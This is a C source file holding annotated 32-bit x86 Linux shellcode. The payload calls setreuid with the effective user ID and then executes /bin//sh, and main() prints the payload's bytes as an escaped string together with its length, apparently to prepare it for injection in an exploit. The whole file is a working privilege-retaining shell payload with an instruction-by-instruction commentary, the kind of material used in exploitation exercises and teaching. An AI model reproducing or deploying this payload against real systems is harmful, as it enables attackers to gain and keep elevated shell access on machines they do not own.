#include <stdio.h>

/*
setreuid(geteuid(), geteuid())
execv("/bin//sh", argv)

where argv[0] = pathname
argv[1] = NULL
*/
char shellcode[] = 
  "\x6a\x31" // push 0x31 (49)
  "\x58"     // pop eax
  "\xcd\x80" // int 0x80 (result in eax), geteuid()

  "\x89\xc3" // mov ebx, eax (uid)
  "\x89\xD9" // mov ecx, ebx
  "\x6a\x46" // push 0x46 (70)
  "\x58"     // pop eax
  "\xcd\x80" // int 0x80, setreuid(geteuid(), geteuid())

  "\x99" // cdq (now edx contain NULL)
  "\x52" // push edx
  "\x68\x2f\x2f\x73\x68" // push "//sh"
  "\x68\x2f\x62\x69\x6e" // push "/bin"
  "\x89\xe3" // mov ebx, esp (now ebx contains: "/bin//sh",\x00)

  "\x52" // push edx (push NULL into stack)
  "\x53" // push ebx (push pathname)
  "\x89\xe1" // mov ecx, esp (ecx is argv)

  "\xb0\x0b" // mov al, 0x0b (11)
  "\xcd\x80"; // int 0x80 (execv("/bin//sh", argv))

int main()
{
  printf("Shellcode as formatted string:\n");
  
  // Iterate through the shellcode array and print each byte in the format \xHH
  for (int i = 0; i < sizeof(shellcode) - 1; i++) {
    printf("\\x%02x", (unsigned char)shellcode[i]); // Print each byte as \xHH
  }
  
  printf("\n"); // Print newline at the end
  printf("len of shellcode is %d bytes", strlen(shellcode));
  return 0;
}
